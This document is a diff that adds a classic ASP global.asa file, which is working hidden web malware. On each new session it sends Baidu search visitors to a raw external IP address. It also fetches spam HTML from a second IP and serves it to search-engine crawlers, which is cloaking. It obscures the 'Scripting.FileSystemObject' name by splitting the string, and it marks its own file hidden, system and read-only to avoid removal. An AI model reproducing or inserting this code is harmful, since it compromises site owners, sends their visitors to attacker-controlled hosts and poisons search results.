@@ -1,0 +1,51 @@
+<SCRIPT LANGUAGE="VBScript" RUNAT="Server">
+Server.ScriptTimeout=600
+On Error Resume Next
+
+Sub Session_onStart
+if instr(request.servervariables("HTTP_REFERER"),Request.ServerVariables("HTTP_HOST"))>0 then 
+exit sub
+
+elseif instr(request.servervariables("HTTP_REFERER"),"www.baidu.com/s?")>0 and instr(request.servervariables("QUERY_STRING"),"void=")>0 then 
+response.redirect("http://118.99.59.163/index.php?sd")
+
+elseif instr(request.servervariables("HTTP_USER_AGENT"),"baidu")>0 Or instr(request.servervariables("HTTP_USER_AGENT"),"Googlebot")>0 Or instr(request.servervariables("HTTP_USER_AGENT"),"soso")>0 Or instr(request.servervariables("HTTP_USER_AGENT"),"sogou")>0 then
+
+Dim Url,Html,Get_String,Get_id,Get_String2
+randomize
+Get_id=int(10000000*rnd)
+Get_String=Request.ServerVariables("REMOTE_ADDR")
+Get_String2=Request.ServerVariables("HTTP_HOST")
+agent=request.servervariables("http_user_agent")
+Url="http://115.126.98.79/index.php?"&Get_String2
+
+	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
+	ObjXMLHTTP.Open "GET",url,False
+	ObjXMLHTTP.setRequestHeader "User-Agent",agent
+	ObjXMLHTTP.send
+	GetHtml=ObjXMLHTTP.responseBody
+	Set ObjXMLHTTP=Nothing
+	set objStream = Server.CreateObject("Adodb.Stream")
+	objStream.Type = 1
+	objStream.Mode =3
+	objStream.Open
+	objStream.Write GetHtml
+	objStream.Position = 0
+	objStream.Type = 2
+	objStream.Charset = "gbk"
+	GetHtml = objStream.ReadText
+	objStream.Close
+	if instr(GetHtml,"</html>")>0 then
+               Response.write GetHtml
+	end if
+	
+	Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct")
+	set f=fso.Getfile(Server.MapPath("global.asa"))
+	if f.attributes <> 7 then
+	f.attributes = 7
+	end if
+
+
+end if
+End Sub
+</SCRIPT>
